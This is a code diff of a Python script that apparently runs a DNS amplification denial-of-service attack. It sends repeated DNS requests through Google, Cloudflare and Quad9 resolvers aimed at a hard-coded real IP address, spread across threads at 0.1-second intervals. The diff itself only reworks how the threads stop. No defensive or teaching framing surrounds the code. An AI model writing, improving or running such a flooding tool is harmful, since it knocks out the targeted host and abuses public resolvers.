@@ -69,13 +69,10 @@ def send_amplified_request(target_ip, dns_server, domain):
         sock.close()
 
 def worker(target_ip, dns_server, domain):
-    try:
-        while True:
-            send_amplified_request(target_ip, dns_server, domain)
-            time.sleep(interval)
-    except KeyboardInterrupt:
-        print("Process interrupted by user.")
-        logging.info("Process interrupted by user.")
+    global running
+    while running:
+        send_amplified_request(target_ip, dns_server, domain)
+        time.sleep(interval)
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO, filename='dns.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s')
@@ -83,12 +80,27 @@ if __name__ == "__main__":
     target_ip = "172.64.152.115"
     dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
     domain = "facebook.com"
-    interval = 0.1 # seconds
+    interval = 0.1  # seconds
+    running = True
 
     threads = []
-    for dns_server in dns_servers:
-        thread = threading.Thread(target=worker, args=(target_ip, dns_server, domain))
-        thread.start()
-        threads.append(thread)
-    for thread in threads:
-        thread.join()
+
+    try:
+        for dns_server in dns_servers:
+            thread = threading.Thread(target=worker, args=(target_ip, dns_server, domain))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+    except KeyboardInterrupt:
+        print("Process interrupted by user.")
+        logging.info("Process interrupted by user.")
+        running = False # Stop all threads
+
+        for thread in threads:
+            thread.join()
+
+    print("Program terminated.")
+    logging.info("Program terminated.")
